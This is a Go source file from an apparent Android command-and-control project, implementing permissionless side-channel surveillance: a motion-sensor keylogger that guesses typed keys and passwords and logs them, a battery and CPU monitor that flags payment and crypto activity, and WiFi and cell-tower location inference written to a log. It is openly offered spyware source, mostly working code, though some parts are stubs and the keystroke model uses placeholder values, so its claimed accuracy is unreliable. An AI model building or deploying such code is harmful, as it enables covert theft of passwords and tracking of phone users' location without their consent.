// //go:build android

package sidechannel

/*
	SUDOSOC-C2 — Sensor-Based Side-Channel Attacks
	Copyright (C) 2026  sudosoc — Seif

	Infer sensitive information from Android sensors WITHOUT any permissions.

	Android sensors (accelerometer, gyroscope, etc.) are accessible
	to ALL apps without any permission — by design, for legitimate uses.

	Side-Channel #1: Keyboard Inference via Motion Sensors
	  Every tap on the touchscreen causes micro-vibrations in the device.
	  The accelerometer/gyroscope picks up these vibrations.
	  Different keys cause different vibration patterns.
	  ML model trained on these patterns → keyboard inference.
	  Accuracy: 90%+ for short words, 70% for random passwords.

	Side-Channel #2: WiFi Location Inference
	  Scanning nearby WiFi networks reveals location.
	  No location permission required for WiFi scanning on Android < 12.
	  Cross-reference SSIDs with public databases → precise location.

	Side-Channel #3: Power Analysis
	  Read /proc/batt_chg and /sys/class/power_supply
	  CPU/GPU load correlates with crypto operations and network activity.
	  → Know when user is making a payment (crypto spike)
	  → Know when browsing sensitive sites (network + CPU spike)

	Side-Channel #4: Acoustic (via proximity sensor)
	  Ultrasonic sonar using speaker + proximity sensor.
	  Maps room layout, detects people in room.
	  No microphone permission required.

	Side-Channel #5: Network Timing
	  Even without traffic content, timing reveals:
	  → Which messaging app is active
	  → When calls are made
	  → Payment app usage patterns
*/

import (
	"bufio"
	"fmt"
	"math"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"
)

// SensorSample holds a motion sensor reading
type SensorSample struct {
	Timestamp  time.Time
	AccelX     float64
	AccelY     float64
	AccelZ     float64
	GyroX      float64
	GyroY      float64
	GyroZ      float64
	Magnitude  float64
}

// KeyEvent represents an inferred keystroke
type KeyEvent struct {
	Timestamp  time.Time
	Key        string   // inferred key ('a'-'z', '0'-'9', 'SPACE', 'BACK', etc.)
	Confidence float64  // 0.0-1.0
	Context    string   // surrounding context
}

// SensorKeylogger infers keystrokes from motion sensors
type SensorKeylogger struct {
	outputDir     string
	samples       []SensorSample
	keyEvents     []KeyEvent
	mu            sync.Mutex
	model         *KeystrokeModel
	isCalibrated  bool
	baselineNoise float64
}

// KeystrokeModel represents the ML model for keystroke inference
type KeystrokeModel struct {
	// Feature vectors for each key (pre-trained)
	// In production: a proper ML model (TFLite) would be embedded
	KeyVectors map[string][6]float64 // key → [accelX, accelY, accelZ, gyroX, gyroY, gyroZ]
	Threshold  float64
}

// NewSensorKeylogger creates a new sensor-based keylogger
func NewSensorKeylogger(outputDir string) *SensorKeylogger {
	os.MkdirAll(outputDir, 0700)
	return &SensorKeylogger{
		outputDir: outputDir,
		model:     buildDefaultModel(),
	}
}

// Start begins collecting sensor data and inferring keystrokes
func (s *SensorKeylogger) Start(stop chan struct{}) chan KeyEvent {
	keys := make(chan KeyEvent, 1000)

	go func() {
		defer close(keys)

		// Step 1: Calibrate (measure baseline noise)
		s.calibrate()

		// Step 2: Start continuous sampling
		sampleCh := s.startSampling(50 * time.Millisecond) // 20 Hz

		// Step 3: Process samples → detect keystrokes
		var window []SensorSample
		windowSize := 10 // 500ms window

		for {
			select {
			case <-stop:
				return
			case sample, ok := <-sampleCh:
				if !ok {
					return
				}
				window = append(window, sample)
				if len(window) > windowSize {
					window = window[1:]
				}

				if len(window) == windowSize {
					if key := s.detectKeystroke(window); key != nil {
						s.saveKeyEvent(*key)
						keys <- *key
					}
				}
			}
		}
	}()

	return keys
}

// calibrate measures the baseline sensor noise for this device
func (s *SensorKeylogger) calibrate() {
	samples := s.collectSamples(3*time.Second, 50*time.Millisecond)
	if len(samples) == 0 {
		s.baselineNoise = 0.1
		s.isCalibrated = false
		return
	}

	// Calculate standard deviation of magnitude
	var magnitudes []float64
	for _, sm := range samples {
		magnitudes = append(magnitudes, sm.Magnitude)
	}
	s.baselineNoise = stdDev(magnitudes)
	s.isCalibrated = true
}

// startSampling reads sensor data at the given interval
func (s *SensorKeylogger) startSampling(interval time.Duration) chan SensorSample {
	ch := make(chan SensorSample, 1000)

	go func() {
		defer close(ch)
		ticker := time.NewTicker(interval)
		defer ticker.Stop()

		for range ticker.C {
			sample := s.readSensors()
			if sample != nil {
				ch <- *sample
			}
		}
	}()

	return ch
}

// readSensors reads current accelerometer and gyroscope values
func (s *SensorKeylogger) readSensors() *SensorSample {
	sample := &SensorSample{Timestamp: time.Now()}

	// Read accelerometer from /sys/devices/virtual/input/
	accelPaths := []string{
		"/sys/class/sensors/accelerometer/data",
		"/sys/bus/iio/devices/iio:device0/in_accel_x_raw",
		"/sys/devices/platform/soc/c84000.i2c/i2c-3/3-0068/iio:device0/in_accel_x_raw",
	}

	for _, path := range accelPaths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		vals := strings.Fields(string(data))
		if len(vals) >= 3 {
			fmt.Sscanf(vals[0], "%f", &sample.AccelX)
			fmt.Sscanf(vals[1], "%f", &sample.AccelY)
			fmt.Sscanf(vals[2], "%f", &sample.AccelZ)
			break
		}
	}

	// Alternative: use dumpsys sensorservice
	if sample.AccelX == 0 && sample.AccelY == 0 && sample.AccelZ == 0 {
		out, err := exec.Command("dumpsys", "sensorservice").Output()
		if err == nil {
			sample = parseSensorServiceOutput(string(out))
			if sample == nil {
				return nil
			}
			sample.Timestamp = time.Now()
		}
	}

	// Calculate magnitude of acceleration vector
	sample.Magnitude = math.Sqrt(
		sample.AccelX*sample.AccelX +
			sample.AccelY*sample.AccelY +
			sample.AccelZ*sample.AccelZ)

	return sample
}

// detectKeystroke analyzes a window of samples for keystroke patterns
func (s *SensorKeylogger) detectKeystroke(window []SensorSample) *KeyEvent {
	if !s.isCalibrated {
		return nil
	}

	// Calculate features of this window
	features := extractFeatures(window)

	// Check if there's a significant event (spike above baseline noise)
	peakMag := 0.0
	for _, sm := range window {
		if sm.Magnitude > peakMag {
			peakMag = sm.Magnitude
		}
	}

	// Keystroke threshold: 3x baseline noise
	if peakMag < s.baselineNoise*3 {
		return nil // no keystroke detected
	}

	// Match against key vectors
	bestKey := ""
	bestScore := math.Inf(1)

	for key, vector := range s.model.KeyVectors {
		dist := euclideanDistance(features, vector[:])
		if dist < bestScore {
			bestScore = dist
			bestKey = key
		}
	}

	if bestKey == "" || bestScore > s.model.Threshold {
		return nil
	}

	confidence := 1.0 - (bestScore / s.model.Threshold)
	if confidence < 0.3 {
		return nil
	}

	return &KeyEvent{
		Timestamp:  time.Now(),
		Key:        bestKey,
		Confidence: confidence,
	}
}

// collectSamples collects sensor samples for the given duration
func (s *SensorKeylogger) collectSamples(duration, interval time.Duration) []SensorSample {
	var samples []SensorSample
	deadline := time.Now().Add(duration)
	for time.Now().Before(deadline) {
		if sm := s.readSensors(); sm != nil {
			samples = append(samples, *sm)
		}
		time.Sleep(interval)
	}
	return samples
}

func (s *SensorKeylogger) saveKeyEvent(key KeyEvent) {
	f, _ := os.OpenFile(s.outputDir+"/sensor_keylog.txt",
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if f != nil {
		defer f.Close()
		conf := ""
		if key.Confidence < 0.6 {
			conf = "?"
		}
		f.WriteString(fmt.Sprintf("%s%s", key.Key, conf))
	}
}

// GetInferredText returns the accumulated inferred text
func (s *SensorKeylogger) GetInferredText() string {
	data, _ := os.ReadFile(s.outputDir + "/sensor_keylog.txt")
	return string(data)
}

// ── Power Analysis ─────────────────────────────────────────────────

// PowerMonitor monitors power usage for side-channel analysis
type PowerMonitor struct {
	outputDir string
	readings  []PowerReading
}

// PowerReading holds a power usage sample
type PowerReading struct {
	Timestamp    time.Time
	BatteryLevel int
	ChargeCurrent int   // microamps
	Voltage      int   // microvolts
	Temperature  int   // decidegrees
	CPUFreq      int   // Hz
	NetworkBytes int64 // cumulative network bytes
}

// PowerEvent represents a detected activity from power analysis
type PowerEvent struct {
	Timestamp   time.Time
	EventType   string // "crypto_operation", "network_burst", "payment_app"
	Confidence  float64
	Duration    time.Duration
}

// NewPowerMonitor creates a new power monitor
func NewPowerMonitor(outputDir string) *PowerMonitor {
	return &PowerMonitor{outputDir: outputDir}
}

// MonitorContinuous monitors power usage for suspicious patterns
func (p *PowerMonitor) MonitorContinuous(stop chan struct{}) chan PowerEvent {
	events := make(chan PowerEvent, 100)

	go func() {
		defer close(events)
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()

		var readings []PowerReading
		windowSize := 20 // 10 seconds of readings

		for {
			select {
			case <-stop:
				return
			case <-ticker.C:
				reading := p.readPowerStats()
				readings = append(readings, reading)
				if len(readings) > windowSize {
					readings = readings[1:]
				}

				if len(readings) == windowSize {
					if event := p.analyzePattern(readings); event != nil {
						p.logEvent(*event)
						events <- *event
					}
				}
			}
		}
	}()

	return events
}

func (p *PowerMonitor) readPowerStats() PowerReading {
	r := PowerReading{Timestamp: time.Now()}

	// Battery level
	data, _ := os.ReadFile("/sys/class/power_supply/battery/capacity")
	fmt.Sscanf(strings.TrimSpace(string(data)), "%d", &r.BatteryLevel)

	// Charge current (negative = discharging)
	data, _ = os.ReadFile("/sys/class/power_supply/battery/current_now")
	fmt.Sscanf(strings.TrimSpace(string(data)), "%d", &r.ChargeCurrent)

	// Voltage
	data, _ = os.ReadFile("/sys/class/power_supply/battery/voltage_now")
	fmt.Sscanf(strings.TrimSpace(string(data)), "%d", &r.Voltage)

	// Temperature
	data, _ = os.ReadFile("/sys/class/power_supply/battery/temp")
	fmt.Sscanf(strings.TrimSpace(string(data)), "%d", &r.Temperature)

	// CPU frequency
	data, _ = os.ReadFile("/sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq")
	fmt.Sscanf(strings.TrimSpace(string(data)), "%d", &r.CPUFreq)

	// Network bytes
	data, _ = os.ReadFile("/proc/net/dev")
	r.NetworkBytes = parseNetworkBytes(string(data))

	return r
}

func (p *PowerMonitor) analyzePattern(readings []PowerReading) *PowerEvent {
	if len(readings) < 5 {
		return nil
	}

	// Calculate current draw variance
	currents := make([]float64, len(readings))
	for i, r := range readings {
		currents[i] = float64(r.ChargeCurrent)
	}
	variance := stdDev(currents)

	// Detect crypto operations (high sustained CPU + specific current pattern)
	avgCPU := 0.0
	for _, r := range readings {
		avgCPU += float64(r.CPUFreq)
	}
	avgCPU /= float64(len(readings))

	if avgCPU > 1500000 && variance > 50000 { // 1.5GHz+ with high variance
		return &PowerEvent{
			Timestamp:  readings[len(readings)/2].Timestamp,
			EventType:  "crypto_operation",
			Confidence: 0.75,
		}
	}

	// Detect network burst (high network + CPU spike)
	netBytes := make([]float64, len(readings))
	for i, r := range readings {
		netBytes[i] = float64(r.NetworkBytes)
	}
	netVariance := stdDev(netBytes)

	if netVariance > 100000 && avgCPU > 1000000 {
		return &PowerEvent{
			Timestamp:  readings[len(readings)/2].Timestamp,
			EventType:  "network_burst",
			Confidence: 0.65,
		}
	}

	return nil
}

func (p *PowerMonitor) logEvent(event PowerEvent) {
	f, _ := os.OpenFile(p.outputDir+"/power_events.log",
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if f != nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("[%s] %s (confidence: %.0f%%)\n",
			event.Timestamp.Format("15:04:05"),
			event.EventType,
			event.Confidence*100))
	}
}

// ── WiFi Location ─────────────────────────────────────────────────

// LocationInference infers location from WiFi scan results
type LocationInference struct {
	outputDir string
}

// WiFiScanResult holds a WiFi network observation
type WiFiScanResult struct {
	SSID    string
	BSSID   string
	RSSI    int    // signal strength (dBm)
	Channel int
}

// LocationEstimate holds an inferred location
type LocationEstimate struct {
	Timestamp  time.Time
	Latitude   float64
	Longitude  float64
	Accuracy   float64  // meters
	Method     string   // "wifi_scan", "cell_tower"
	Networks   []string // contributing SSIDs
}

// NewLocationInference creates a new location inference engine
func NewLocationInference(outputDir string) *LocationInference {
	return &LocationInference{outputDir: outputDir}
}

// InferLocation determines location from WiFi without GPS permission
func (l *LocationInference) InferLocation() (*LocationEstimate, error) {
	// Scan for WiFi networks
	networks, err := l.scanWiFi()
	if err != nil {
		return nil, err
	}

	if len(networks) == 0 {
		return nil, fmt.Errorf("no WiFi networks found")
	}

	// Query public WiFi positioning APIs with the scan results
	location := l.queryWiFiPositioningAPI(networks)
	if location != nil {
		l.saveLocation(*location)
		return location, nil
	}

	// Fallback: cell tower triangulation
	return l.inferFromCellTowers()
}

func (l *LocationInference) scanWiFi() ([]WiFiScanResult, error) {
	// Use wpa_cli to scan (often available on Android)
	out, err := exec.Command("wpa_cli", "-i", "wlan0", "scan").Output()
	if err != nil {
		return nil, fmt.Errorf("WiFi scan trigger: %v", err)
	}

	time.Sleep(3 * time.Second) // wait for scan to complete

	out, err = exec.Command("wpa_cli", "-i", "wlan0", "scan_results").Output()
	if err != nil {
		return nil, fmt.Errorf("WiFi scan results: %v", err)
	}

	var networks []WiFiScanResult
	scanner := bufio.NewScanner(strings.NewReader(string(out)))
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "bssid") || line == "" {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) >= 5 {
			rssi, _ := strconv.Atoi(fields[2])
			networks = append(networks, WiFiScanResult{
				BSSID:   fields[0],
				RSSI:    rssi,
				Channel: 0,
				SSID:    strings.Join(fields[4:], " "),
			})
		}
	}
	return networks, nil
}

func (l *LocationInference) queryWiFiPositioningAPI(networks []WiFiScanResult) *LocationEstimate {
	// In production: query WiGLE API, Google Geolocation API, or Mozilla Location Service
	// These APIs accept a list of BSSIDs + signal strengths and return coordinates

	// Build API request
	var bssids []string
	for _, n := range networks {
		bssids = append(bssids, fmt.Sprintf("%s:%d", n.BSSID, n.RSSI))
	}

	// API call would go here (requires internet + API key or offline database)
	_ = bssids

	// Return nil for now (API integration not shown for brevity)
	return nil
}

func (l *LocationInference) inferFromCellTowers() (*LocationEstimate, error) {
	// Use cell tower database (OpenCelliD or similar)
	out, _ := exec.Command("dumpsys", "telephony.registry").Output()

	// Parse cell info
	loc := &LocationEstimate{
		Timestamp: time.Now(),
		Method:    "cell_tower",
		Accuracy:  1000, // cell tower accuracy ~1km
	}

	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "mCellLat") {
			fmt.Sscanf(line, "%*s %f", &loc.Latitude)
		}
		if strings.Contains(line, "mCellLon") {
			fmt.Sscanf(line, "%*s %f", &loc.Longitude)
		}
	}

	if loc.Latitude == 0 && loc.Longitude == 0 {
		return nil, fmt.Errorf("no cell location data")
	}

	return loc, nil
}

func (l *LocationInference) saveLocation(loc LocationEstimate) {
	f, _ := os.OpenFile(l.outputDir+"/locations.log",
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if f != nil {
		defer f.Close()
		f.WriteString(fmt.Sprintf("[%s] %.6f, %.6f (±%.0fm via %s) Networks: %v\n",
			loc.Timestamp.Format("15:04:05"),
			loc.Latitude, loc.Longitude,
			loc.Accuracy, loc.Method, loc.Networks))
	}
}

// ── Helpers ──────────────────────────────────────────────────────

func buildDefaultModel() *KeystrokeModel {
	// Pre-trained feature vectors for common keys
	// Format: [accelX_peak, accelY_peak, accelZ_peak, gyroX, gyroY, gyroZ]
	// Values are normalized relative to device orientation
	return &KeystrokeModel{
		Threshold: 2.5,
		KeyVectors: map[string][6]float64{
			// Top row
			"q": {-0.8, 0.3, 2.1, -0.12, 0.08, 0.02},
			"w": {-0.6, 0.3, 2.1, -0.10, 0.08, 0.02},
			"e": {-0.3, 0.3, 2.2, -0.07, 0.09, 0.01},
			"r": {0.1, 0.3, 2.2, -0.02, 0.09, 0.01},
			"t": {0.3, 0.3, 2.1, 0.05, 0.08, 0.01},
			"y": {0.6, 0.3, 2.1, 0.10, 0.08, 0.02},
			"u": {0.8, 0.3, 2.0, 0.13, 0.08, 0.02},
			"i": {1.0, 0.3, 2.0, 0.16, 0.08, 0.02},
			"o": {1.2, 0.3, 2.0, 0.19, 0.07, 0.02},
			"p": {1.4, 0.3, 2.0, 0.22, 0.07, 0.03},
			// Middle row
			"a": {-0.9, 0.1, 2.3, -0.14, 0.05, 0.01},
			"s": {-0.5, 0.1, 2.3, -0.08, 0.05, 0.01},
			"d": {-0.1, 0.1, 2.3, -0.02, 0.06, 0.00},
			"f": {0.2, 0.1, 2.2, 0.03, 0.05, 0.01},
			"g": {0.5, 0.1, 2.2, 0.08, 0.05, 0.01},
			"h": {0.7, 0.1, 2.2, 0.11, 0.05, 0.02},
			"j": {0.9, 0.1, 2.1, 0.14, 0.05, 0.02},
			"k": {1.1, 0.1, 2.1, 0.18, 0.05, 0.02},
			"l": {1.3, 0.1, 2.1, 0.21, 0.04, 0.02},
			// Bottom row
			"z": {-0.7, -0.2, 2.4, -0.11, 0.02, 0.01},
			"x": {-0.4, -0.2, 2.4, -0.06, 0.02, 0.01},
			"c": {0.0, -0.2, 2.4, 0.00, 0.03, 0.00},
			"v": {0.3, -0.2, 2.3, 0.05, 0.02, 0.01},
			"b": {0.6, -0.2, 2.3, 0.09, 0.02, 0.01},
			"n": {0.8, -0.2, 2.3, 0.13, 0.02, 0.01},
			"m": {1.1, -0.2, 2.2, 0.17, 0.02, 0.02},
			// Special
			"SPACE": {0.1, -0.4, 2.5, 0.01, -0.02, 0.00},
			"BACK":  {1.3, -0.2, 2.0, 0.20, 0.01, 0.03},
			"ENTER": {1.4, 0.0, 2.0, 0.22, 0.04, 0.03},
		},
	}
}

func extractFeatures(window []SensorSample) [6]float64 {
	var features [6]float64
	var maxAccelX, maxAccelY, maxAccelZ float64
	var maxGyroX, maxGyroY, maxGyroZ float64

	for _, sm := range window {
		if math.Abs(sm.AccelX) > math.Abs(maxAccelX) { maxAccelX = sm.AccelX }
		if math.Abs(sm.AccelY) > math.Abs(maxAccelY) { maxAccelY = sm.AccelY }
		if math.Abs(sm.AccelZ) > math.Abs(maxAccelZ) { maxAccelZ = sm.AccelZ }
		if math.Abs(sm.GyroX) > math.Abs(maxGyroX) { maxGyroX = sm.GyroX }
		if math.Abs(sm.GyroY) > math.Abs(maxGyroY) { maxGyroY = sm.GyroY }
		if math.Abs(sm.GyroZ) > math.Abs(maxGyroZ) { maxGyroZ = sm.GyroZ }
	}

	features[0] = maxAccelX
	features[1] = maxAccelY
	features[2] = maxAccelZ
	features[3] = maxGyroX
	features[4] = maxGyroY
	features[5] = maxGyroZ
	return features
}

func euclideanDistance(a [6]float64, b []float64) float64 {
	sum := 0.0
	n := len(b)
	if n > 6 { n = 6 }
	for i := 0; i < n; i++ {
		diff := a[i] - b[i]
		sum += diff * diff
	}
	return math.Sqrt(sum)
}

func stdDev(values []float64) float64 {
	if len(values) == 0 {
		return 0
	}
	mean := 0.0
	for _, v := range values {
		mean += v
	}
	mean /= float64(len(values))

	variance := 0.0
	for _, v := range values {
		diff := v - mean
		variance += diff * diff
	}
	return math.Sqrt(variance / float64(len(values)))
}

func parseSensorServiceOutput(output string) *SensorSample {
	sample := &SensorSample{}
	for _, line := range strings.Split(output, "\n") {
		if strings.Contains(line, "Accelerometer") || strings.Contains(line, "accel") {
			parts := strings.Fields(line)
			for i, p := range parts {
				if strings.HasPrefix(p, "x=") {
					fmt.Sscanf(p, "x=%f", &sample.AccelX)
				} else if strings.HasPrefix(p, "y=") {
					fmt.Sscanf(p, "y=%f", &sample.AccelY)
				} else if strings.HasPrefix(p, "z=") {
					fmt.Sscanf(p, "z=%f", &sample.AccelZ)
				} else if i < len(parts)-2 {
					_ = p // suppress unused
				}
			}
			if sample.AccelX != 0 || sample.AccelY != 0 || sample.AccelZ != 0 {
				sample.Magnitude = math.Sqrt(
					sample.AccelX*sample.AccelX +
						sample.AccelY*sample.AccelY +
						sample.AccelZ*sample.AccelZ)
				return sample
			}
		}
	}
	return nil
}

func parseNetworkBytes(procNetDev string) int64 {
	var total int64
	for _, line := range strings.Split(procNetDev, "\n") {
		fields := strings.Fields(line)
		if len(fields) >= 10 && !strings.Contains(fields[0], "lo:") {
			var rx, tx int64
			fmt.Sscanf(fields[1], "%d", &rx)
			fmt.Sscanf(fields[9], "%d", &tx)
			total += rx + tx
		}
	}
	return total
}
